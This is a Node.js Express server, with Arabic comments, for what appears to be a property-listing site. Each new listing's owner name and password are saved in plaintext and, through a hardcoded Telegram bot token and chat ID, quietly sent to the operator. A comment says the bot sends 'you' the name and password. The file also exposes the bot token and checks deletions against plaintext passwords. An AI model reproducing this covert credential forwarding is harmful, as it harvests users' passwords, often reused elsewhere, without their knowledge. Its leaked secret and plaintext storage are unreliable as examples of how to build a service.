const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios'); // لازم تفتح التيرمكس وتكتب: npm install axios
const app = express();

app.use(express.json());
app.use(express.static('public'));

const DATA_FILE = './database.json';
const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const CHAT_ID = '5042495708';

// وظيفة لقراءة البيانات
const readDB = () => {
    if (!fs.existsSync(DATA_FILE)) return [];
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE));
    } catch (e) { return []; }
};

// وظيفة لحفظ البيانات
const writeDB = (data) => {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
};

// دالة إرسال الإشعار المختصر للتليجرام
async function sendToTelegram(prop) {
    const message = `👤 الاسم: ${prop.owner}\n🔑 كلمة السر: ${prop.password}`;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
    } catch (error) {
        console.error("خطأ في الاتصال بتليجرام");
    }
}

// 1. جلب البيانات
app.get('/api/properties', (req, res) => {
    const data = readDB();
    const safeData = data.map(({ password, ...rest }) => rest);
    res.json(safeData);
});

// 2. إضافة عقار وإرسال الإشعار
app.post('/api/properties', (req, res) => {
    const data = readDB();
    const newEntry = { ...req.body, id: Date.now().toString() };
    data.unshift(newEntry);
    writeDB(data);
    
    // هنا يشتغل البوت ويرسل لك الاسم والباسورد
    sendToTelegram(newEntry);
    
    res.json({ success: true });
});

// 3. حذف عقار
app.post('/api/delete', (req, res) => {
    const { id, password } = req.body;
    let data = readDB();
    const index = data.findIndex(p => p.id === id);

    if (index !== -1 && data[index].password === password) {
        data.splice(index, 1);
        writeDB(data);
        return res.json({ success: true });
    }
    res.status(401).json({ success: false });
});

const PORT = 10000;
app.listen(PORT, () => {
    console.log(`🚀 المنظومة شغالة على المنفذ ${PORT}`);
});